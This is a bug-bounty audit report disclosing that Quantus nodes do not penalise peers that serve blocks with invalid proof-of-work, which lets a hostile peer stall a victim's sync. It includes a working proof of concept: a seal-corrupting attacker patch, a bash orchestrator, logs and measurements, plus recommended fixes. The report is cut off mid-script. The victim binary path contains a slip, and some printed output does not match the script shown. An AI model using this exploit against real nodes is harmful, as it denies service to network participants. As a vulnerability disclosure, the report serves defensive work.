# 88219 bc medium blocks with invalid proof of work carry no peer penalty a hostile peer can force unlimited sync restarts and is re admitted as a stranger every time

## #88219 \[BC-Medium] Blocks with invalid proof-of-work carry no peer penalty: a hostile peer can force unlimited sync restarts and is re-admitted as a stranger every time

**Submitted on Aug 12th 2026 at 09:50:40 UTC by @shadowHunter for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88219
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

### Description

### 1. Summary

Quantus removed upstream `sc-consensus-pow` and wrote its own import pipeline. Two consequences followed, and together they remove the economic asymmetry that makes proof-of-war spam self-limiting:

1. **The seal is verified in the wrong place.** `SimplePowVerifier::verify` — the `Verifier` implementation the import queue calls — does not check the proof-of-work at all. It only pops the seal digest. The actual check moved into `import_block`, and it runs *after* a full WASM `check_inherents` call over the attacker's entire block.
2. **A seal failure is therefore not attributed to the peer.** Because the check no longer happens in the verifier, `InvalidSeal` cannot surface as `BlockImportError::VerificationFailed` — the variant that carries a `peer_id` and triggers `DropPeer`. It surfaces as `BlockImportError::Other`, whose handler logs a warning, wipes sync state, and restarts — **with no `DropPeer` and no reputation change**.

The result is that a peer can serve blocks with garbage proof-of-work indefinitely and is never penalised. Measured over a 150-second run: **18 rejected blocks, 7 sync restarts, 9 peer re-admissions, 0 reputation actions**, and the victim never advanced past genesis.

The node's own disconnect tracker logs the same peer as being added **"for the first time"** on separate occasions — direct evidence that no memory of the misbehaviour is retained.

### 2. Description

#### 2.1 The verifier does not verify the proof-of-work

```rust
// client/consensus/qpow/src/lib.rs:442-453
/// Minimal verifier that extracts the PoW seal from header to post_digests.
struct SimplePowVerifier;

#[async_trait::async_trait]
impl<B> Verifier<B> for SimplePowVerifier
where
	B: BlockT<Hash = H256>,
{
	async fn verify(&self, block: BlockImportParams<B>) -> Result<BlockImportParams<B>, String> {
		extract_pow_seal::<B>(block).await
	}
}
```

`extract_pow_seal` only length-checks the digest and pops the seal item. There is no difficulty lookup and no hash comparison. Upstream `sc-consensus-pow`'s `PowVerifier::verify` performs the seal check at exactly this point; this relocation is the introduced delta.

#### 2.2 Expensive work runs before the cheap check

In `import_block`, the block is first passed through `check_inherents`:

```rust
// client/consensus/qpow/src/lib.rs:249-262
if let Some(inner_body) = block_import_params.body.take() {
	let check_block = B::new(block_import_params.header.clone(), inner_body);

	if !block_import_params.state_action.skip_execution_checks() {
		self.check_inherents(
			check_block.clone(),
			parent_hash,
			self.create_inherent_data_providers
				.create_inherent_data_providers(parent_hash, ())
				.await?,
		)
		.await?;
	}
```

`check_inherents` is a runtime API call: WASM instantiation, parent-state access, and SCALE-encoding of the entire attacker-supplied block into WASM memory, preceded by two full block clones. `node/src/service.rs:647` passes `check_inherents_after = 0`, so no block height escapes it.

Only afterwards is the seal checked:

```rust
// client/consensus/qpow/src/lib.rs:293-296
if !verified {
	log::error!("Invalid Seal {:?} for parent hash {:?}", inner_seal, parent_hash);
	return Err(Error::<B>::InvalidSeal.into());
}
```

That check is genuinely cheap — `qpow-math/src/lib.rs:7-49` is one Poseidon2 sponge over a fixed 96-byte input plus a 512-bit division, with no attacker-controllable cost. It should run first.

#### 2.3 The peer-attribution asymmetry

`Err(Error::InvalidSeal)` returned from `import_block` maps to `BlockImportError::Other`. These two arms sit adjacent in the same `match`:

```rust
// client/network-sync/src/strategy/chain_sync.rs:747-762
Err(BlockImportError::VerificationFailed(peer_id, e)) => {
	let extra_message = peer_id
		.map_or_else(|| "".into(), |peer| format!(" received from ({peer})"));

	warn!(
		target: LOG_TARGET,
		"💔 Verification failed for block {hash:?}{extra_message}: {e:?}",
	);

	if let Some(peer) = peer_id {
		self.actions
			.push(SyncingAction::DropPeer(BadPeer(peer, rep::VERIFICATION_FAIL)));
	}

	self.restart();
},
```

```rust
// client/network-sync/src/strategy/chain_sync.rs:777-782
e @ Err(BlockImportError::UnknownParent) | e @ Err(BlockImportError::Other(_)) => {
	warn!(target: LOG_TARGET, "💔 Error importing block {hash:?}: {}", e.unwrap_err());
	self.state_sync = None;
	self.restart();
},
Err(BlockImportError::Cancelled) => {},
```

The first drops the peer with `rep::VERIFICATION_FAIL`. The second does not. Invalid proof-of-work — the one thing a PoW chain must punish, because it is the only proof that a peer expended real work — lands in the second.

`restart()` (`chain_sync.rs:1698-1726`) clears `self.blocks`, resets the sync start point, and pushes `SyncingAction::CancelRequest` for **every** peer in a downloading state, not just the offending one.

### 3. Steps to reproduce

{% stepper %}
{% step %}

### An attacker runs a node that publishes blocks with invalid proof-of-work

No special position is needed: any peer that can be connected to, or that a victim uses as a bootnode, will do. The attacker mines normally and then corrupts one byte of the seal before publishing, so the block is well-formed but carries no valid work:

```rust
seal[0] ^= 0xFF;   // block is structurally valid, proof-of-work is garbage
```

{% endstep %}

{% step %}

### A victim node connects and requests the attacker's chain

Ordinary sync behaviour. The victim sees the attacker announce a higher block and schedules a request:

```
sync: New peer QmS8ma...LmoY with best hash 0xcd8f…40e2 (1).
sync: Scheduling block request to PeerId("QmS8ma...LmoY"): fields=HEADER | BODY | JUSTIFICATION
```

{% endstep %}

{% step %}

### The victim performs the expensive work first, then rejects the block

`check_inherents` runs over the whole block (WASM instantiation, runtime call), and only afterwards does the seal check fail:

```
sc_consensus_qpow: Invalid Seal [255, 0, 0, 0, ... ] for parent hash 0xc117…9b4b
sync::import-queue: Error importing block 1: 0xcd8f…40e2: Import failed: PoW validation error: invalid seal
sync: 💔 Error importing block 0xcd8f…40e2: consensus error: Import failed: PoW validation error: invalid seal
```

Note the leading `255` — that is the `^ 0xFF` corruption, confirming the seal reached verification unmodified.
{% endstep %}

{% step %}

### The victim wipes its sync state and restarts, cancelling requests to all peers

```
sync: Restarting sync with client info Info { best_hash: 0xc117…9b4b, best_number: 0, ... }
sync: Restarted with 0 (0xc117…9b4b)
```

{% endstep %}

{% step %}

### The attacker is not penalised, and is re-admitted as a stranger

No reputation change is recorded. The node's disconnect tracker then logs the same peer as new again on a later cycle:

```
sync::disconnected_peers: Added peer QmS8ma...LmoY for the first time
sync::disconnected_peers: Peer QmS8ma...LmoY is available for queries
sync::disconnected_peers: Added peer QmS8ma...LmoY for the first time      <-- "first time" again
```

{% endstep %}

{% step %}

### Repeat indefinitely at no cost

Because nothing was debited, the attacker simply serves the same block again. Over 150 seconds the victim logged **18 rejections across 6 rounds, 7 restarts and 9 re-admissions**, and never advanced past block 0.
{% endstep %}
{% endstepper %}

### 4. Impact

**A peer can consume a victim's sync capacity indefinitely at negligible cost and is never penalised.**

Each bad block costs the attacker essentially nothing — no proof-of-work, no funds, no identity, roughly 1 KB on the wire. Each one costs the victim two full block clones, a WASM instantiation, a whole-body runtime call, and — most damagingly — **a full sync restart that cancels in-flight block requests to every connected peer**, not merely the offending one.

Consequences:

* **A node that is behind can be held there.** A freshly started node, or one recovering after downtime, repeatedly discards its download progress. In the two-node experiment the victim never left genesis across 150 seconds despite a peer advertising a longer chain.
* **The punishment mechanism that exists is bypassed.** `rep::VERIFICATION_FAIL` and `DropPeer` are implemented and used for the adjacent error class. Invalid proof-of-work simply never reaches them.
* **No accumulation, so no eventual mitigation.** Because the peer is recorded as new each cycle, there is no threshold it can ever cross. Peer-reputation decay and ban thresholds are irrelevant to an offence that is never reported.
* **Verification ordering amplifies the cost.** The expensive check runs before the cheap one, so a peer with zero hashrate makes the victim do runtime-level work per junk block.

#### The cross-peer effect — measured (§6.7)

A three-node experiment (honest miner **H**, victim **V**, attacker **A**) settles the question of whether a hostile peer degrades a victim's *legitimate* downloads from honest peers. It does.

| Phase                 | Duration | V imported | H produced | **V keeps up with H** | V lag at end | `Invalid Seal` |
| --------------------- | -------: | ---------: | ---------: | --------------------: | -----------: | -------------: |
| Baseline (no A)       |    120 s |         35 |         35 |           **100.0 %** |            0 |              0 |
| **Attack**            |    240 s |         59 |         74 |            **79.7 %** |       **15** |              2 |
| Recovery (A detached) |    150 s |         65 |         65 |           **100.0 %** |            0 |              0 |

The phase totals *understate* it, because V did not slow down evenly — it stalled outright and then caught up in bursts. Per-10-second interval:

```
BASELINE  +2 +1 +2 +6 +4 +3 +3 +4 +6 +2 +1 +1        gap to H = 0 in all 12 intervals
ATTACK     0  0  0  0  0  0 |+19|  0 0 0 0 0 0 |+17|  0 0 0 0 0 |+23|  0 0 0 0
RECOVERY  +4 +5 +4 +3 +4 +8 +3 +4 +7 +4 +5 +3 +6 +4 +1   gap = 0 in all 15 intervals
```

**V imported nothing in 21 of 24 attack intervals (87.5 %).** Its own status line during the stall, with the honest peer connected and producing:

```
16:44:34 ⚙️  Syncing  0.0 bps, target=#112 (2 peers), best: #61 ..., ⬇ 0.5kiB/s ⬆ 12.4kiB/s
16:47:25 ⚙️  Syncing  0.0 bps, target=#175 (2 peers), best: #97 ..., ⬇ 0.5kiB/s ⬆ 12.5kiB/s
```

Upload rises from **\~0.1 kiB/s at baseline to \~12.4 kiB/s** during the attack — the victim is spending its bandwidth on the attacker rather than on the chain. (It settles at 0.3 kiB/s in recovery, above baseline because V now has a longer chain to serve.)

The request counts come from a **separate, `sync=debug`-level run** of the same three-node topology, not from the `info`-level run tabulated above — debug logging is what makes the per-request lines visible at all, and mixing the two would be misleading. In that run, over a 68.4-second window V issued **84,325 block requests to A (\~1,230/sec) against 32 to H** — an asymmetry of about **2,600 : 1**. Across the whole run the totals were 84,325 to A and 292 to H. The debug log names the starved peer directly:

```
DEBUG sync: ➡️ Sent block request to QmefyxQ…(A): 270..270
DEBUG sync: No request produced for PeerId("QmS1GQ…")      <-- H, the honest peer
```

Two caveats on this second run, stated because they are the kind of thing that should not surface first in triage. Its orchestrator's 60-second attach poll timed out before A connected and printed `PHASE 2 IS VOID`; A attached shortly afterwards and the attack did land (`a_peers=1`, 2 `Invalid Seal`, 4 sync restarts), but the run was not clean by its own gate. And 240 MB of debug log in 68 seconds is itself a load — which is precisely why the `info`-level run above, not this one, is the authoritative measurement of the stall.

#### The contrast that makes this a defect rather than a design choice

In the `info`-level run, **both** nodes reported the attacker within about four seconds of it attaching (A attached at 16:44:12), and both for the same reason — request spam, not invalid proof-of-work:

```
honest.log:523  16:44:16  Report QmdWFG…: Reason: Same block request multiple times. Banned, disconnecting.
victim.log:99   16:44:12  Report QmdWFG…: -2147483648 to -2147483648. Reason: Same block request multiple times. Banned, disconnecting.
```

The two outcomes then diverge completely:

* **On H, the attacker never persisted.** H's peer count never exceeds 1 in any status line of the entire run (`(1 peers)` ×111, `(0 peers)` ×15, `(2 peers)` ×0) — its one peer being V. A's connection was short-lived enough never to appear in a 5-second sample, and A never reappears after the report. Note this is an *absence* of A from H's peer count, not an observed 2→1 transition; the report line is the direct evidence, the peer count is corroborating.
* **On V, the ban changed nothing.** V held **`peers: 2` for the entire 240-second attack window** (`(2 peers)` on every status line from 16:44:14 to 16:48:14, dropping to `Idle (1 peers)` only at 16:48:19, after A was detached externally). V stayed degraded for the full four minutes despite having emitted the ban four seconds in.

Two things follow, and they are the actual finding:

1. **The reputation system never sees the offence that matters.** All 8 of this run's import failures (2 `Invalid Seal`, 6 `unknown parent`) produced *no* reputation change. The only report V emitted in the entire run was for duplicate block requests — a side-effect of the retry loop, not a judgement about the blocks. `grep -icE "banned|report |reported|disconnecting|reputation" victim.log` returns **1**, and that one line is the request-spam report. In the two-node PoC of §6, where V is not driven into the same request loop, the equivalent case-insensitive search returns **0** across 18 invalid seals.
2. **A ban does not evict a reserved peer.** V had A in its reserved set (the topology requires V to dial A, see §6.7), and the ban did not disconnect it. So even when the machinery does fire, it does not remove the attacker.

The ban machinery exists and works — it fired on both nodes, within seconds, for a lesser offence. Serving blocks with forged proof-of-work never reaches it at all.

{% hint style="info" %}
**Correction note.** An earlier revision of this report stated that the victim "never banned it, never disconnected it". That was wrong, and the error was mine: the harness grepped V's log with a case-sensitive pattern (`Reported|banned|Disconnecting`) that cannot match the actual text (`Report` , `Banned,`, `disconnecting.`), printed an empty section, and the claim was written from that empty output rather than from the log. The corrected facts are above. The finding is unchanged — invalid proof-of-work still produces no reputation change — but the contrast is narrower than originally stated.
{% endhint %}

#### Scope, stated honestly

* **Attribution is broader than a single line.** The stall is not purely `restart()`'s `CancelRequest`. V is also locked in an ancestor-search / re-request loop against A (\~1,230 req/s in the debug-level run), during which no request is produced for H. `restart()` clearing `self.blocks` is part of that loop — and the periodic restarts are in fact what let V *briefly* catch up. The consequence (honest downloads disrupted) is measured; pinning it on the `CancelRequest` line alone would be narrower than what was observed.
* **Magnitude depends on the attacker's chain shape.** Here A served a private bad-seal fork from genesis, so V's ancestor search resolved all the way to genesis and it looped hard. A variant where A instead reorged onto the victim's chain and appended one invalid block at tip+1 produced only 1–2 rejections. A real adversary would choose the former; the latter was not measured.
* **The attacker held reserved status, and that bounds the duration claim.** The harness connects A by calling `system_addReservedPeer` on V (§6.7), because `--reserved-only` prevents A from dialing out on this backend. A is therefore in V's **reserved set** — and that is why the ban V emitted at 16:44:12, four seconds after A attached, did not disconnect it. A real attacker cannot place itself in a victim's reserved set. **The cross-peer disruption itself is not in question — the reject → `restart()` → re-request loop runs regardless of reserved status while the peer is connected — but the measured 240-second&#x20;*****duration*****&#x20;is specific to this topology.** Against an ordinary inbound peer the ban would be expected to evict the attacker within seconds, converting a sustained stall into a reconnect loop. That variant was **not measured**, and this report does not claim the 79.7 % figure holds for it. Establishing the non-reserved magnitude requires a separate run with A as an ordinary inbound peer and H shielded from A.
* **n = 1 per phase**, single run. The effect is large and both controls are clean, but this is one trial.

### 5. Recommendation

1. **Check the seal in the verifier, before the expensive work.** Move the proof-of-work check into `SimplePowVerifier::verify`, restoring upstream `sc-consensus-pow` ordering. The check is a single Poseidon2 hash and a comparison; performing it before `check_inherents` means a junk block is discarded for microseconds of work instead of a WASM runtime call.
2. **Attribute seal failures to the peer.** Return `BlockImportError::VerificationFailed(peer_id, ..)` for invalid proof-of-work so the existing `DropPeer(BadPeer(peer, rep::VERIFICATION_FAIL))` path applies. Once 5.1 is done this happens naturally, since verifier failures already carry the peer id.
3. **Consider a negative cache of rejected header hashes.** There is currently no `known_bad` set in `client/consensus/qpow`, so the identical block can be re-offered without limit. Even with peer punishment in place, caching rejected hashes prevents repeated expensive re-validation of the same block from different peers.
4. **Reconsider the blast radius of `restart()`.** Cancelling in-flight requests to every peer because one peer sent a bad block lets a single hostile peer disrupt downloads from honest ones. Scoping the reset to the offending peer would remove that lever.

## Proof of Concept

### 6. Proof of concept

Everything below is complete and self-contained.

#### 6.1 Environment

|         |                                                |
| ------- | ---------------------------------------------- |
| OS      | Ubuntu 24.04.1 LTS (WSL2 on Windows)           |
| CPU     | AMD Ryzen 7 5800H (12 cores), 9.9 GB RAM       |
| Rust    | 1.93.0 (pinned by the repo's `rust-toolchain`) |
| Targets | `wasm32v1-none`                                |

#### 6.2 Setup

```bash
git clone https://github.com/immunefi-team/audit-comp-quantus-chain quantus-chain
cd quantus-chain
git checkout audit-comp-ready      # 3b243b870a5442a6e5f443056f67bbba87d472f5 (in-scope commit)

rustup toolchain install 1.93.0
rustup target add wasm32v1-none --toolchain 1.93.0
apt-get install -y clang libclang-dev protobuf-compiler pkg-config libssl-dev cmake build-essential

# Required: on Ubuntu 24.04 libclang is outside the default search path and the
# build otherwise fails at clang-sys v1.8.1.
export LIBCLANG_PATH=/usr/lib/llvm-18/lib
```

**Build the VICTIM first, from pristine source, and set it aside:**

```bash
cargo build --release --locked -p quantus-node -j 6
mkdir -p ~/quantus-poc/bin
cp target/release/quantus-node ~/quantus-poc/bin/quantus-node-victim
```

The victim must be built **before** any patch is applied. This is the binary under test; its rejection and peer-handling paths are completely unmodified.

#### 6.3 The attacker instrumentation

The attacker simulates a hostile peer. Everything is gated behind the environment variable `QPOC_EVIL_SEAL`, so with the variable unset the source behaves exactly like the stock node.

Save as `poc3_attacker.diff` in the repository root and apply with `git apply poc3_attacker.diff`:

```diff
diff --git a/client/consensus/qpow/src/lib.rs b/client/consensus/qpow/src/lib.rs
index 97756592..4025d3f8 100644
--- a/client/consensus/qpow/src/lib.rs
+++ b/client/consensus/qpow/src/lib.rs
@@ -291,8 +291,15 @@ where
 			})?;
 
 		if !verified {
-			log::error!("Invalid Seal {:?} for parent hash {:?}", inner_seal, parent_hash);
-			return Err(Error::<B>::InvalidSeal.into());
+			// PoC #3 ATTACKER INSTRUMENTATION: with QPOC_EVIL_SEAL set, this node
+			// imports its own bad-seal block so it has a chain to announce.
+			// Unset (the victim), this is the stock rejection.
+			if std::env::var("QPOC_EVIL_SEAL").is_ok() {
+				log::warn!("QPOC_EVIL_SEAL: importing block with INVALID seal (attacker mode)");
+			} else {
+				log::error!("Invalid Seal {:?} for parent hash {:?}", inner_seal, parent_hash);
+				return Err(Error::<B>::InvalidSeal.into());
+			}
 		}
 
 		// Get parent's cumulative achieved work from aux storage. A backend/decode
diff --git a/client/consensus/qpow/src/worker.rs b/client/consensus/qpow/src/worker.rs
index d4a547ca..78fc8760 100644
--- a/client/consensus/qpow/src/worker.rs
+++ b/client/consensus/qpow/src/worker.rs
@@ -160,7 +160,15 @@ where
 
 	/// Submit a mined seal. The seal will be validated before consuming the build.
 	/// Returns true if the submission is successful.
-	pub async fn submit(&self, seal: Seal) -> bool {
+	pub async fn submit(&self, mut seal: Seal) -> bool {
+		// PoC #3 ATTACKER INSTRUMENTATION: corrupt the mined seal so the block we
+		// publish carries invalid proof-of-work. Gated on QPOC_EVIL_SEAL; with the
+		// variable unset this function is byte-for-byte the stock implementation.
+		let qpoc_evil = std::env::var("QPOC_EVIL_SEAL").is_ok();
+		if qpoc_evil && !seal.is_empty() {
+			seal[0] ^= 0xFF;
+			warn!(target: LOG_TARGET, "QPOC_EVIL_SEAL: corrupted seal byte 0 before publishing");
+		}
 		// Atomically verify and take the build in a single lock acquisition.
 		// This prevents TOCTOU issues where a rebuild could land between verify and consume.
 		let build = {
@@ -193,7 +201,12 @@ where
 				},
 			};
 
-			match self.client.runtime_api().verify_nonce_local_mining(best_hash, pre_hash, nonce) {
+			let qpoc_result = if qpoc_evil {
+				Ok(true) // attacker skips its own seal check
+			} else {
+				self.client.runtime_api().verify_nonce_local_mining(best_hash, pre_hash, nonce)
+			};
+			match qpoc_result {
 				Ok(true) => {
 					// Seal is valid, take the build. This cannot be None because:
 					// - We hold the lock continuously since checking as_ref() above
```

Then build the attacker binary:

```bash
cargo build --release --locked -p quantus-node -j 6
cp target/release/quantus-node ~/quantus-poc/bin/quantus-node-attacker
```

**Why this does not weaken the result.** The patch changes only the *attacker*. It makes that node (a) publish a seal that is invalid, and (b) accept its own invalid block so it has a chain to announce — precisely what a real malicious peer would do with a custom client. The victim binary is untouched and was built before the patch existed. Nothing in the patch affects how the victim verifies, rejects, or attributes blame.

#### 6.4 The orchestrator

Save as `poc3_run.sh`, `chmod +x`, and run. It starts both nodes, proves the code asymmetry against the victim's own source, drives the experiment, and reports results.

```bash
#!/usr/bin/env bash
# PoC #3 - bad-seal blocks force indefinite sync restarts with NO peer penalty.
#
# Topology:
#   ATTACKER : patched build, QPOC_EVIL_SEAL=1, mining ON.
#   VICTIM   : PRISTINE release build, unmodified, mining OFF.
set -uo pipefail

BIN="$HOME/quantus-poc/bin"
ATTACKER="$BIN/quantus-node-attacker"
VICTIM="$BIN/quantus-poc/bin/quantus-node-victim"
POC="$HOME/quantus-poc/poc3-badseal"
OUT="$POC/out"

A_P2P=30333; A_RPC=9944
V_P2P=30334; V_RPC=9945; V_MINER=9834
A_PATH=/tmp/qpoc3-attacker
V_PATH=/tmp/qpoc3-victim
RUNTIME_SECS="${RUNTIME_SECS:-150}"

mkdir -p "$OUT"

echo "### binaries"
"$VICTIM" --version; sha256sum "$VICTIM"
"$ATTACKER" --version; sha256sum "$ATTACKER"

echo "### the code asymmetry (victim's own source)"
sed -n '747,762p' "$HOME/quantus-poc/chain/client/network-sync/src/strategy/chain_sync.rs"
sed -n '777,782p' "$HOME/quantus-poc/chain/client/network-sync/src/strategy/chain_sync.rs"
sed -n '442,453p' "$HOME/quantus-poc/chain/client/consensus/qpow/src/lib.rs"

rm -rf "$A_PATH" "$V_PATH" 2>/dev/null

echo "### starting ATTACKER (mining ON, seal corruption ON)"
QPOC_EVIL_SEAL=1 RUST_LOG=info,sc_consensus_qpow=debug \
"$ATTACKER" --dev --base-path "$A_PATH" --port "$A_P2P" --rpc-port "$A_RPC" \
  --no-telemetry --no-prometheus --name ATTACKER \
  > "$OUT/attacker.log" 2>&1 &
A_PID=$!

cleanup() { kill "$A_PID" 2>/dev/null; kill "$V_PID" 2>/dev/null; }
trap cleanup EXIT

for i in $(seq 1 60); do (echo > /dev/tcp/127.0.0.1/"$A_RPC") 2>/dev/null && break; sleep 1; done
sleep 3

A_PEER=$(curl -s -H "Content-Type: application/json" \
  --data '{"jsonrpc":"2.0","method":"system_localPeerId","id":1}' \
  http://127.0.0.1:$A_RPC | python3 -c "import sys,json; print(json.load(sys.stdin)['result'])")
echo "    attacker peer id = $A_PEER"

echo "    waiting for attacker to mine a chain of (bad-seal) blocks ..."
sleep 75

echo "### starting VICTIM (pristine build, mining OFF, bootnode = attacker)"
RUST_LOG=info,sc_consensus_qpow=debug,sync=debug \
"$VICTIM" --dev --base-path "$V_PATH" --port "$V_P2P" --rpc-port "$V_RPC" \
  --miner-listen-port "$V_MINER" \
  --no-telemetry --no-prometheus --name VICTIM \
  --bootnodes "/ip4/127.0.0.1/tcp/$A_P2P/p2p/$A_PEER" \
  --reserved-nodes "/ip4/127.0.0.1/tcp/$A_P2P/p2p/$A_PEER" \
  > "$OUT/victim.log" 2>&1 &
V_PID=$!

for i in $(seq 1 60); do (echo > /dev/tcp/127.0.0.1/"$V_RPC") 2>/dev/null && break; sleep 1; done

for t in $(seq 1 $((RUNTIME_SECS/15))); do
  sleep 15
  VB=$(curl -s -H "Content-Type: application/json" \
    --data '{"jsonrpc":"2.0","method":"system_syncState","id":1}' \
    http://127.0.0.1:$V_RPC | python3 -c "import sys,json; d=json.load(sys.stdin)['result']; print(f\"best={d['currentBlock']} target={d['highestBlock']}\")")
  ERRS=$(grep -c "Error importing block\|Invalid Seal" "$OUT/victim.log")
  echo "    t=$((t*15))s  victim $VB  import_errors=$ERRS"
done

echo "### RESULTS"
echo "rejections : $(grep -cE 'Invalid Seal|Error importing block' "$OUT/victim.log")"
echo "restarts   : $(grep -c 'Restarting sync with client info' "$OUT/victim.log")"
echo "re-admits  : $(grep -c 'New peer Qm' "$OUT/victim.log")"
echo "penalties  : $(grep -icE 'reporting|banned|blacklist|DropPeer|reputation' "$OUT/victim.log")"
grep -E "disconnected_peers" "$OUT/victim.log" | tail -3
```

#### 6.5 PoC output

**Binaries under test** — note the victim is the pristine build, saved before the attacker patch existed:

```
quantus-node-victim 0.9.0-endless-sky-223d938923a
84c31d34edc2440f779f9f24d7947cd2e6523d56e99afa21abacbd8ee997670c  quantus-node-victim
quantus-node-attacker 0.9.0-endless-sky-223d938923a
bbc763b1cc2ed4d2f41078ac9ab6637704b67f83174f2d6bb31dc51c0af930a3  quantus-node-attacker
```

**Progression of the run:**

```
### starting ATTACKER (mining ON, seal corruption ON)
    attacker pid = 853
    attacker peer id = QmS8maTtDMDo4MyBvvLoLBSDicie4sKaw95rmRmJBxLmoY
    waiting for attacker to mine a chain of (bad-seal) blocks ...
    corrupted seals published: 4
    attacker best block = 2

### starting VICTIM (pristine build, mining OFF, bootnode = attacker)
    victim pid = 1476
    letting the victim attempt to sync for 150s ...
    t=15s   victim best=0 target=0  peers=0 syncing=False  import_errors=6
    t=30s   victim best=0 target=0  peers=0 syncing=False  import_errors=6
    t=45s   victim best=0 target=0  peers=0 syncing=False  import_errors=6
    t=60s   victim best=0 target=0  peers=0 syncing=False  import_errors=6
    t=75s   victim best=0 target=0  peers=0 syncing=False  import_errors=12
    t=90s   victim best=0 target=0  peers=0 syncing=False  import_errors=12
    t=105s  victim best=0 target=0  peers=0 syncing=False  import_errors=12
    t=120s  victim best=0 target=0  peers=0 syncing=False  import_errors=12
    t=135s  victim best=0 target=0  peers=0 syncing=False  import_errors=12
    t=150s  victim best=0 target=0  peers=0 syncing=False  import_errors=18
```

**The rejection, verbatim from the victim log:**

```
2026-08-11 12:23:39.973 ERROR tokio-runtime-worker sc_consensus_qpow: Invalid Seal [255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 138, 85, 251, 191, 221, 203, 58, 162, 117, 38, 27, 81, 17, 240, 100, 170] for parent hash 0xc11761eba9667514bfc7ea3d0479e1a867138d457c0309437ccb5e9911ec9b4b
2026-08-11 12:23:39.973 DEBUG tokio-runtime-worker sync::import-queue: Error importing block 1: 0xcd8febd5a4a856f3534d34dabe7ce9516e878aec950241ce3774673af3a240e2: Import failed: PoW validation error: invalid seal
2026-08-11 12:23:39.973  WARN tokio-runtime-worker sync: 💔 Error importing block 0xcd8febd5a4a856f3534d34dabe7ce9516e878aec950241ce3774673af3a240e2: consensus error: Import failed: PoW validation error: invalid seal
```

**The restart, and the peer being treated as new again:**

```
2026-08-11 12:22:30.487  WARN sync: 💔 Error importing block ...: PoW validation error: invalid seal
2026-08-11 12:22:30.488 DEBUG sync: Restarting sync with client info Info { best_hash: 0xc117…9b4b, best_number: 0, ... }
2026-08-11 12:22:30.488 DEBUG sync: Restarted with 0 (0xc117…9b4b)
2026-08-11 12:22:30.488 DEBUG sync::disconnected_peers: Added peer QmS8maTtDMDo4MyBvvLoLBSDicie4sKaw95rmRmJBxLmoY for the first time
2026-08-11 12:23:39.971 DEBUG sync::disconnected_peers: Peer QmS8maTtDMDo4MyBvvLoLBSDicie4sKaw95rmRmJBxLmoY is available for queries
2026-08-11 12:23:39.976 DEBUG sync::disconnected_peers: Added peer QmS8maTtDMDo4MyBvvLoLBSDicie4sKaw95rmRmJBxLmoY for the first time
```

**Final tallies:**

```
rejections : 18
restarts   : 7
re-admits  : 9
penalties  : 0
victim best block: {"startingBlock":0,"currentBlock":0,"highestBlock":0}
```

#### 6.6 Explanation of the output

**`penalties: 0` is the finding.** Across 18 rejected blocks carrying invalid proof-of-work, the victim recorded not one reputation change, ban, or `DropPeer` action. A case-insensitive search over the entire victim log of **this two-node run** returns zero:

```
$ grep -icE "banned|report |reported|disconnecting|reputation|blacklist|droppeer" victim.log
0
```

The punishment machinery exists and is wired to the adjacent error class — it is simply never reached by this offence.

(In the three-node cross-peer run of §6.7 the same search returns **1** — a report for *duplicate block requests*, triggered by the retry loop that topology induces, which did not disconnect the peer. See §4. It is still not a penalty for the invalid proof-of-work.)

**`Invalid Seal [255, 0, 0, …]` proves the corruption arrived intact.** Byte 0 is `255`, which is `0x00 ^ 0xFF` — the attacker's modification. The block was structurally valid enough to be decoded, requested, and pushed all the way through `check_inherents` into seal verification.

**`restarts: 7` shows the `Other(_)` arm firing.** Each `💔 Error importing block` is immediately followed by `Restarting sync with client info` and `Restarted with 0`. That is the exact code path quoted in §2.3 — warn, wipe `state_sync`, restart — with the `DropPeer` line conspicuously absent compared to the arm 30 lines above it.

**"Added peer … for the first time", twice, is the clearest single piece of evidence.** The node's own disconnect tracker has no recollection of this peer between cycles. Whatever reputation decay or ban threshold exists elsewhere is irrelevant: an offence that is never reported can never accumulate.

**`import_errors` climbing 6 → 12 → 18 while `best` stays 0** shows the loop is not a one-off. Six rounds in 150 seconds, and the victim ends exactly where it started, despite a peer continuously advertising a longer chain.

**Honest note on `peers=0` in the samples.** The connection is transient — the attacker serves its short chain, the request fails, the peer disconnects, and `--reserved-nodes` brings it back roughly every 70 seconds. The sampling happens to catch the gaps. This does not weaken the result: the point is that the peer is *always welcome back*, which is precisely what the absence of a penalty means. A real attacker with a longer bad chain, or simply more patience, holds the connection continuously.

#### 6.7 Second experiment — cross-peer disruption of honest downloads

Three nodes, same binaries and chain spec as §6.2–6.3:

* **H** — honest miner, pristine binary, `--validator --force-authoring`
* **V** — victim, pristine binary, **not** a validator (syncs only), bootnode + reserved = H
* **A** — attacker, `QPOC_EVIL_SEAL=1`, attached to V only during the attack phase

A is kept mining in **all three phases** so CPU load is constant; only its *connection* to V changes. The metric is deliberately **V's keep-up ratio against H**, not absolute blocks/min, because difficulty ramps during a run.

**Two setup facts that cost three void runs — record these:**

1. **`--reserved-only` silently prevents a node from dialing its own bootnodes/reserved peers** on this litep2p backend. The attacker sat at 0 peers for minutes while `system_addReservedPeer` returned `{"result":null}` (success). **The victim must dial the attacker**, not the reverse.
2. To keep A isolated from H while still reachable by V, start A with `--in-peers 0 --out-peers 1 --reserved-nodes <V>`; for the isolated phases use `--in-peers 0 --reserved-only` with an empty reserved set.

Load-bearing part of the harness:

```bash
H_P2P=30821; H_RPC=9971   # honest miner : --validator --force-authoring, pristine
V_P2P=30822; V_RPC=9972   # victim       : pristine, NOT a validator, bootnode+reserved = H
A_P2P=30823; A_RPC=9973   # attacker     : QPOC_EVIL_SEAL=1

start_attacker() {                       # $1 = isolated | attachable
  local mode=$1; local -a EXTRA=()
  if [ "$mode" = attachable ]; then
    # V is in A's reserved set so A accepts V's inbound dial; --in-peers 0 keeps
    # every OTHER node (notably H) from connecting to A.
    EXTRA=(--in-peers 0 --out-peers 1 --reserved-nodes "/ip4/127.0.0.1/tcp/$V_P2P/p2p/$V_PEER")
  else
    EXTRA=(--in-peers 0 --reserved-only) # reserved-only + zero reserved == isolated
  fi
